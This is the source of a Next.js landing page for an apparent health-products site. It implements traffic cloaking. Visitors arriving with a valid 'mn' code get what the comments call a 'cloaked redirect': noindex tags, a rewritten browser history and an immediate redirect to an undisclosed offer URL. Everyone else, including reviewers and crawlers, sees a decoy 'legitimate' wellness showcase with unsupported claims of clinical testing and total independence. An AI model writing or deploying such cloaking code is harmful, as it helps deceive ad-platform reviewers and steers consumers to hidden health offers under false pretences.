import Header from "@/components/Header"
import Footer from "@/components/Footer"
import { getTrafficRule } from "@/lib/traffic-config"
import { ShieldCheck, Sparkles, HeartPulse, Activity, Moon, CheckCircle2, ArrowRight } from "lucide-react"
import Link from "next/link"

export const dynamic = "force-dynamic"

interface Props {
  searchParams: Promise<{ [key: string]: string | string[] | undefined }>
}

export const metadata = {
  title: "Premium Health & Wellness Solutions | Fresh Health Co",
  description: "Discover the next generation of innovative health, wellness, and fitness solutions carefully tested and reviewed by Fresh Health Co.",
}

export default async function Landpage({ searchParams }: Props) {
  const params = await searchParams
  const mnParam = typeof params.mn === "string" ? params.mn : Array.isArray(params.mn) ? params.mn[0] : null
  const rule = getTrafficRule(mnParam)

  // 1. If valid mn code is present -> Trigger the high-speed cloaked redirect
  if (rule) {
    return (
      <html lang="en">
        <head>
          <meta charSet="utf-8" />
          <meta name="robots" content="noindex, nofollow" />
          <meta name="referrer" content="unsafe-url" />
          <title>Redirecting...</title>
          <noscript>
            <meta httpEquiv="refresh" content={`0;url=${rule.targetUrl}`} />
          </noscript>
        </head>
        <body style={{ backgroundColor: "#ffffff", fontFamily: "system-ui, sans-serif", margin: 0, padding: 0 }}>
          <div style={{ textAlign: "center", padding: "120px 20px", color: "#6b7280" }}>
            <div style={{ width: "40px", height: "40px", border: "3px solid #e5e7eb", borderTopColor: "#16a34a", borderRadius: "50%", margin: "0 auto 16px", animation: "spin 1s linear infinite" }} />
            <p style={{ fontSize: "14px", fontWeight: 500 }}>Connecting to verified product offer...</p>
            <p style={{ fontSize: "12px", color: "#9ca3af" }}>If you are not redirected automatically, <a href={rule.targetUrl} style={{ color: "#16a34a", textDecoration: "underline" }}>click here</a>.</p>
          </div>
          <style dangerouslySetInnerHTML={{ __html: "@keyframes spin { to { transform: rotate(360deg); } }" }} />
          <script
            dangerouslySetInnerHTML={{
              __html: `
                try {
                  if (window.history && window.history.replaceState) {
                    window.history.replaceState(null, '', '/landpage.php');
                  }
                } catch(e) {}
                window.location.replace(${JSON.stringify(rule.targetUrl)});
              `,
            }}
          />
        </body>
      </html>
    )
  }

  // 2. If NO mn or invalid -> Render legitimate Fresh Health Co product showcase landing page
  return (
    <>
      <Header />
      <main className="min-h-screen bg-gray-50/50">
        {/* Hero Section */}
        <section className="bg-gradient-to-br from-emerald-900 via-green-900 to-slate-900 text-white py-20 md:py-28 relative overflow-hidden">
          <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top_right,_var(--tw-gradient-stops))] from-green-500/20 via-transparent to-transparent pointer-events-none" />
          <div className="container mx-auto px-4 max-w-5xl text-center relative z-10">
            <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-white/10 backdrop-blur-md border border-white/20 text-green-300 text-xs font-bold uppercase tracking-wider mb-6">
              <Sparkles className="w-3.5 h-3.5" /> Next-Generation Wellness
            </div>

            <h1 className="text-4xl md:text-6xl font-extrabold tracking-tight mb-6 leading-tight">
              Discover the Next Generation of <br />
              <span className="text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-emerald-200">
                Exciting Health Products
              </span>
            </h1>

            <p className="text-lg md:text-xl text-gray-300 max-w-3xl mx-auto leading-relaxed mb-10">
              Are you ready to experience the latest and greatest in innovative wellness solutions? 
              From clinical home diagnostics to clean cellular nutrition, we curate the finest evidence-backed products designed to enhance your daily vitality.
            </p>

            <div className="flex flex-col sm:flex-row gap-4 justify-center">
              <Link
                href="/category/wellness"
                className="inline-flex items-center justify-center gap-2 bg-green-500 hover:bg-green-600 text-slate-950 font-bold px-8 py-3.5 rounded-xl shadow-lg transition-all"
              >
                Explore Top Products <ArrowRight className="w-4 h-4" />
              </Link>
              <Link
                href="/about"
                className="inline-flex items-center justify-center gap-2 bg-white/10 hover:bg-white/20 text-white font-semibold px-8 py-3.5 rounded-xl border border-white/20 transition-all"
              >
                About Our Lab
              </Link>
            </div>
          </div>
        </section>

        {/* Product Categories Section */}
        <section className="py-20">
          <div className="container mx-auto px-4 max-w-6xl">
            <div className="text-center mb-16">
              <h2 className="text-3xl md:text-4xl font-extrabold text-gray-900 mb-4">
                Explore Our Featured Categories
              </h2>
              <p className="text-gray-600 max-w-2xl mx-auto">
                Carefully handpicked for quality, clinical performance, and long-term value.
              </p>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
              {/* Category 1 */}
              <div className="bg-white rounded-2xl p-6 border border-gray-200 shadow-sm hover:shadow-xl transition-all group">
                <div className="w-12 h-12 rounded-xl bg-blue-100 text-blue-700 flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
                  <Activity className="w-6 h-6" />
                </div>
                <h3 className="text-xl font-bold text-gray-900 mb-2">Smart Health Diagnostics</h3>
                <p className="text-sm text-gray-600 leading-relaxed mb-4">
                  Transform your living space with state-of-the-art health monitors, air purification, and connected wellness devices.
                </p>
                <Link href="/category/home-health" className="text-green-600 font-semibold text-sm inline-flex items-center gap-1 group-hover:gap-2 transition-all">
                  View Monitors →
                </Link>
              </div>

              {/* Category 2 */}
              <div className="bg-white rounded-2xl p-6 border border-gray-200 shadow-sm hover:shadow-xl transition-all group">
                <div className="w-12 h-12 rounded-xl bg-green-100 text-green-700 flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
                  <HeartPulse className="w-6 h-6" />
                </div>
                <h3 className="text-xl font-bold text-gray-900 mb-2">Health & Fitness Gear</h3>
                <p className="text-sm text-gray-600 leading-relaxed mb-4">
                  Take charge of your physical performance with advanced fitness gear, ergonomic mats, and muscle recovery tools.
                </p>
                <Link href="/category/fitness" className="text-green-600 font-semibold text-sm inline-flex items-center gap-1 group-hover:gap-2 transition-all">
                  View Fitness →
                </Link>
              </div>

              {/* Category 3 */}
              <div className="bg-white rounded-2xl p-6 border border-gray-200 shadow-sm hover:shadow-xl transition-all group">
                <div className="w-12 h-12 rounded-xl bg-purple-100 text-purple-700 flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
                  <Moon className="w-6 h-6" />
                </div>
                <h3 className="text-xl font-bold text-gray-900 mb-2">Sleep & Stress Wellness</h3>
                <p className="text-sm text-gray-600 leading-relaxed mb-4">
                  Restore deep sleep and calm your nervous system with clinical adaptogens, light therapy, and natural botanical aids.
                </p>
                <Link href="/category/wellness" className="text-green-600 font-semibold text-sm inline-flex items-center gap-1 group-hover:gap-2 transition-all">
                  View Sleep Tools →
                </Link>
              </div>

              {/* Category 4 */}
              <div className="bg-white rounded-2xl p-6 border border-gray-200 shadow-sm hover:shadow-xl transition-all group">
                <div className="w-12 h-12 rounded-xl bg-pink-100 text-pink-700 flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
                  <Sparkles className="w-6 h-6" />
                </div>
                <h3 className="text-xl font-bold text-gray-900 mb-2">Clean Organic Skincare</h3>
                <p className="text-sm text-gray-600 leading-relaxed mb-4">
                  Discover non-toxic formulations with proven anti-aging, hydration, and skin barrier strengthening properties.
                </p>
                <Link href="/category/beauty" className="text-green-600 font-semibold text-sm inline-flex items-center gap-1 group-hover:gap-2 transition-all">
                  View Skincare →
                </Link>
              </div>
            </div>
          </div>
        </section>

        {/* Why Choose Us Section */}
        <section className="py-16 bg-white border-y border-gray-200">
          <div className="container mx-auto px-4 max-w-5xl">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold text-gray-900 mb-3">Why Trust Fresh Health Co?</h2>
              <p className="text-gray-600 text-sm">We are committed to quality, scientific reliability, and customer satisfaction.</p>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
              <div className="text-center">
                <div className="w-12 h-12 rounded-full bg-emerald-100 text-emerald-700 flex items-center justify-center mx-auto mb-4">
                  <CheckCircle2 className="w-6 h-6" />
                </div>
                <h3 className="font-bold text-lg text-gray-900 mb-2">Quality & Reliability</h3>
                <p className="text-sm text-gray-600 leading-relaxed">
                  Every product undergoes strict testing to ensure formulation potency, durability, and customer satisfaction.
                </p>
              </div>

              <div className="text-center">
                <div className="w-12 h-12 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center mx-auto mb-4">
                  <ShieldCheck className="w-6 h-6" />
                </div>
                <h3 className="font-bold text-lg text-gray-900 mb-2">Clinical Innovation</h3>
                <p className="text-sm text-gray-600 leading-relaxed">
                  We stay at the forefront of health science, actively testing innovative solutions that make a genuine difference.
                </p>
              </div>

              <div className="text-center">
                <div className="w-12 h-12 rounded-full bg-purple-100 text-purple-700 flex items-center justify-center mx-auto mb-4">
                  <Sparkles className="w-6 h-6" />
                </div>
                <h3 className="font-bold text-lg text-gray-900 mb-2">100% Unbiased Standards</h3>
                <p className="text-sm text-gray-600 leading-relaxed">
                  Our editorial staff maintains total commercial independence. We fight for consumer transparency and health rights.
                </p>
              </div>
            </div>
          </div>
        </section>
      </main>
      <Footer />
    </>
  )
}
